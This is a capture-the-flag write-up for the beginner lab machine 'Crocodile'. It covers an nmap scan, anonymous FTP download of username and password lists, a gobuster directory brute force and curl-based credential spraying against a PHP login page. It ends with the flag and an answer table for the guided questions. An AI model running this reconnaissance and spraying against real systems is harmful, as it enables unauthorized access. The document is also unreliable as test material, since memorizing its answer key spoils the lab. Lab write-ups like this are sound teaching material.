# Crocodile

|            |                                                                                  |
|------------|----------------------------------------------------------------------------------|
| Track      | Starting Point - Tier 1                                                          |
| Difficulty | Very Easy                                                                        |
| OS         | Linux                                                                            |
| Tags       | FTP, Web, Apache, Reconnaissance, Anonymous Access, Credential Reuse             |
| Tools      | `nmap`, `ftp` (or `curl`), `gobuster`, browser                                   |

## Summary

Anonymous FTP exposes two files: a list of usernames and a list of passwords.
The web server on port 80 has a `login.php` that accepts one of the
admin/password combinations from the FTP loot, which redirects to a dashboard
that prints the flag.

## Recon

Default-script + version scan:

```bash
nmap -sC -sV 10.129.109.27
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
```

## Enumeration

### FTP

Anonymous login is allowed. Pull both files down:

```bash
ftp 10.129.109.27
# Name: anonymous
# Password: <blank>
ftp> ls
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

```
$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin

$ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Four usernames, four passwords. `admin` is the obvious high-value account.

### Web

The site root is a static template. Dirbust for PHP files:

```bash
gobuster dir -u http://10.129.109.27/ -w /usr/share/dirb/wordlists/common.txt -x php
```

```
/login.php            (Status: 200)
/dashboard            (Status: 301)
```

`login.php` posts `Username` / `Password` fields to itself.

## Foothold

Try the FTP creds against the login form. Spraying the four users against the
four passwords lands a hit on `admin:rKXM59ESxesUFHAd`, which 302s to
`/dashboard/index.php`.

```bash
curl -i -c jar -d 'Username=admin&Password=rKXM59ESxesUFHAd&Submit=Login' \
  http://10.129.109.27/login.php
# HTTP/1.1 302 Found
# Location: /dashboard/index.php
```

## Flag

The dashboard prints the flag right in the page header:

```html
<h1 class="h3 mb-0 text-gray-800">Here is your flag: c7110277ac44d78b6a9fff2232434d16</h1>
```

```
c7110277ac44d78b6a9fff2232434d16
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | What Nmap scanning switch employs the use of default scripts during a scan? | -sC |
| 2 | What service version is found to be running on port 21? | vsftpd 3.0.3 |
| 3 | What FTP code is returned to us for the "Anonymous FTP login allowed" message? | 230 |
| 4 | After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? | anonymous |
| 5 | After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? | get |
| 6 | What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? | admin |
| 7 | What version of Apache HTTP Server is running on the target host? | Apache httpd 2.4.41 |
| 8 | What switch can we use with Gobuster to specify we are looking for specific filetypes? | -x |
| 9 | Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? | login.php |
| Flag | Submit root flag | `c7110277ac44d78b6a9fff2232434d16` |
